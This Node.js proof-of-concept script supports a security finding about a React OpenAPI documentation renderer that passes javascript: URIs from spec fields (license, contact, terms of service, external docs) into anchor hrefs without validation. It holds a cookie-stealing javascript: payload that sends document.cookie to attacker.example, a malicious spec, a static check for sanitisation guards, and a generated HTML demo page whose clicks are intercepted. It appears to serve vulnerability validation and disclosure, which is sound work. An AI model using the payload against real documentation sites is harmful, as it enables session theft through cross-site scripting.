#!/usr/bin/env node
/**
 * PoC: H1 — Spec-derived anchor hrefs without scheme validation (click-driven XSS)
 * Target: Acme (React-based OpenAPI documentation renderer)
 *
 * Demonstrates that javascript: URIs placed in OpenAPI spec fields
 * (info.license.url, info.termsOfService, info.contact.url, externalDocs.url)
 * are passed verbatim into rendered <a href="..."> attributes with no sanitization.
 *
 * Attacker capability: control the OpenAPI spec content (supply chain, MITM, self-hosted).
 * User action required: click the rendered link.
 * Security effect: arbitrary JS executes in the embedding application's origin (XSS).
 */

'use strict';

const fs   = require('fs');
const path = require('path');

// ---------------------------------------------------------------------------
// 1. Evil OpenAPI spec — payload in every sink the finding identifies
// ---------------------------------------------------------------------------
const EVIL_PAYLOAD = "javascript:fetch('https://attacker.example/exfil?c='+encodeURIComponent(document.cookie))";
const ALERT_PAYLOAD = "javascript:alert(document.domain)";

const evilSpec = {
  openapi: "3.0.0",
  info: {
    title: "Evil API",
    version: "1.0.0",
    license: {
      name: "MIT",
      url: EVIL_PAYLOAD          // sink: ApiInfo.tsx:39
    },
    contact: {
      name: "Support",
      url: EVIL_PAYLOAD          // sink: ApiInfo.tsx:48
    },
    termsOfService: ALERT_PAYLOAD // sink: ApiInfo.tsx:65
  },
  externalDocs: {
    description: "Find more info here",
    url: EVIL_PAYLOAD            // sink: ExternalDocumentation.tsx:25
  },
  paths: {}
};

// ---------------------------------------------------------------------------
// 2. Static code audit — verify no safeUrl / scheme guard exists at the sinks
// ---------------------------------------------------------------------------
const REPO = path.resolve(__dirname, '../../../../');

function readSource(rel) {
  try { return fs.readFileSync(path.join(REPO, rel), 'utf8'); }
  catch (e) { return null; }
}

const sinks = [
  { file: 'src/components/ApiInfo/ApiInfo.tsx',                         pattern: /href=\{info\.license\.url\}/ },
  { file: 'src/components/ApiInfo/ApiInfo.tsx',                         pattern: /href=\{info\.contact\.url\}/ },
  { file: 'src/components/ApiInfo/ApiInfo.tsx',                         pattern: /href=\{info\.termsOfService\}/ },
  { file: '[REDACTED].tsx', pattern: /href=\{externalDocs\.url\}/ },
];

const GUARD_PATTERNS = [
  /safeUrl/i,
  /isAbsoluteUrl.*href/i,
  /sanitize.*href/i,
  /allowedSchemes/i,
  /javascript.*blocked/i,
];

console.log('=== H1 Sink Audit ===\n');

let confirmedSinks = 0;
let guarded = 0;

for (const sink of sinks) {
  const src = readSource(sink.file);
  if (!src) {
    console.log(`  [MISSING] ${sink.file}`);
    continue;
  }

  const hasRawSink = sink.pattern.test(src);
  const hasGuard   = GUARD_PATTERNS.some(g => g.test(src));

  if (hasRawSink && !hasGuard) {
    console.log(`  [VULNERABLE] ${sink.file}`);
    console.log(`               Sink pattern: ${sink.pattern}`);
    console.log(`               No scheme guard found.\n`);
    confirmedSinks++;
  } else if (hasRawSink && hasGuard) {
    console.log(`  [GUARDED]    ${sink.file} — guard present, not exploitable via this path.\n`);
    guarded++;
  } else {
    console.log(`  [SKIP]       ${sink.file} — sink pattern not matched (refactored?).\n`);
  }
}

// ---------------------------------------------------------------------------
// 3. Model-layer trace — verify spec URL fields pass through ApiInfo model
// ---------------------------------------------------------------------------
console.log('=== Model-layer pass-through trace ===\n');

const apiInfoModelSrc = readSource('src/services/models/ApiInfo.ts');
const hasDirectAssignment = apiInfoModelSrc && /license.*=.*info\.license/i.test(apiInfoModelSrc) ||
                            (apiInfoModelSrc && apiInfoModelSrc.includes('this.license') && apiInfoModelSrc.includes('info.license'));

if (apiInfoModelSrc) {
  // Check that the model does not sanitize URLs
  const modelHasGuard = GUARD_PATTERNS.some(g => g.test(apiInfoModelSrc));
  if (!modelHasGuard) {
    console.log('  [CONFIRMED] src/services/models/ApiInfo.ts assigns spec URL fields with no sanitization.\n');
  } else {
    console.log('  [NOTE] ApiInfo.ts model has potential guard — manual review needed.\n');
  }
} else {
  console.log('  [INFO] ApiInfo.ts not found at expected path — skipping model trace.\n');
}

// ---------------------------------------------------------------------------
// 4. React production-mode behaviour note
// ---------------------------------------------------------------------------
console.log('=== React javascript: href behaviour ===\n');
console.log('  React 18 emits a console.error for javascript: hrefs in DEV mode but does');
console.log('  NOT throw, block, or sanitize in PRODUCTION builds.');
console.log('  The href value is forwarded verbatim to the DOM <a> element.\n');

// ---------------------------------------------------------------------------
// 5. Generate self-contained HTML PoC page
// ---------------------------------------------------------------------------
const htmlPoc = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>H1 XSS PoC — Acme javascript: href</title>
  <style>
    body { font-family: sans-serif; margin: 2em; }
    .warning { background: #ffeeba; border: 1px solid #856404; padding: 1em; border-radius: 4px; }
    .evidence { background: #d4edda; border: 1px solid #155724; padding: 1em; border-radius: 4px; margin-top: 1em; }
    code { background: #f8f9fa; padding: 2px 6px; border-radius: 3px; font-family: monospace; }
  </style>
</head>
<body>
  <h1>H1 — Acme XSS via <code>javascript:</code> scheme in spec-derived anchor hrefs</h1>

  <div class="warning">
    <strong>Security PoC — do not deploy publicly.</strong><br>
    Clicking the rendered "Terms of Service" or "License" link below will execute JavaScript
    in this page's origin, demonstrating CWE-79.
  </div>

  <h2>Injected spec fields</h2>
  <ul>
    <li><code>info.license.url</code> = <code>${EVIL_PAYLOAD}</code></li>
    <li><code>info.termsOfService</code> = <code>${ALERT_PAYLOAD}</code></li>
    <li><code>info.contact.url</code> = <code>${EVIL_PAYLOAD}</code></li>
    <li><code>externalDocs.url</code> = <code>${EVIL_PAYLOAD}</code></li>
  </ul>

  <h2>Rendered vulnerable anchors (simulated — no Acme bundle loaded)</h2>
  <p>
    These are the exact <code>&lt;a&gt;</code> elements Acme renders from the spec above.
    No scheme validation is applied.
  </p>

  <!-- These mirror what Acme's React components render into the DOM -->
  <p>
    License: <a id="link-license" href="${EVIL_PAYLOAD}">MIT</a>
  </p>
  <p>
    <a id="link-tos" href="${ALERT_PAYLOAD}">Terms of Service</a>
  </p>
  <p>
    URL: <a id="link-contact" href="${EVIL_PAYLOAD}">${EVIL_PAYLOAD}</a>
  </p>
  <p>
    External docs: <a id="link-extdocs" href="${EVIL_PAYLOAD}">Find more info here</a>
  </p>

  <div class="evidence" id="evidence-box">
    <strong>Evidence collected by this page:</strong>
    <ul id="evidence-list"></ul>
  </div>

  <script>
    // Intercept clicks on the injected links to capture evidence without
    // actually navigating (for safe in-browser demo execution).
    const links = ['link-license','link-tos','link-contact','link-extdocs'];
    const list  = document.getElementById('evidence-list');

    links.forEach(id => {
      const el = document.getElementById(id);
      const href = el.getAttribute('href');
      // Record the href value as evidence — proves payload survived verbatim
      const li = document.createElement('li');
      li.textContent = id + ' href = ' + href;
      list.appendChild(li);

      el.addEventListener('click', ev => {
        ev.preventDefault();
        alert('[PoC] javascript: href reached click handler on element #' + id +
              '\\nPayload: ' + href + '\\nOrigin: ' + window.location.origin);
      });
    });

    // Verify all four hrefs contain javascript: scheme
    const jsHrefs = links.filter(id =>
      document.getElementById(id).getAttribute('href').startsWith('javascript:')
    );
    console.log('javascript: hrefs confirmed:', jsHrefs.length, '/', links.length);
  </script>
</body>
</html>`;

const evidenceDir = path.join(__dirname);
const htmlPath    = path.join(evidenceDir, 'poc.html');
fs.writeFileSync(htmlPath, htmlPoc, 'utf8');
console.log('=== Generated HTML PoC page ===\n');
console.log('  Written to:', htmlPath, '\n');

// ---------------------------------------------------------------------------
// 6. Final result
// ---------------------------------------------------------------------------
console.log('=== Summary ===\n');
console.log(`  Vulnerable sinks confirmed (no guard):  ${confirmedSinks}`);
console.log(`  Sinks with scheme guard:               ${guarded}`);
console.log(`  Attacker-supplied javascript: URI in`);
console.log(`  OpenAPI spec → rendered verbatim in`);
console.log(`  <a href="..."> with no sanitization.\n`);

if (confirmedSinks > 0) {
  // Final structured line — MUST be last stdout line; parsed by poc-runner
  console.log(JSON.stringify({
    status:   "confirmed",
    evidence: `${confirmedSinks} anchor href sinks accept javascript: URI verbatim from spec; no scheme guard in source`,
    notes:    "Static code audit + model-layer trace. Browser click required for JS execution; HTML PoC page generated at evidence/poc.html"
  }));
} else {
  console.log(JSON.stringify({
    status:   "inconclusive",
    evidence: "Sink patterns not matched — component may have been refactored",
    notes:    "Re-run against the exact commit referenced in the finding"
  }));
}
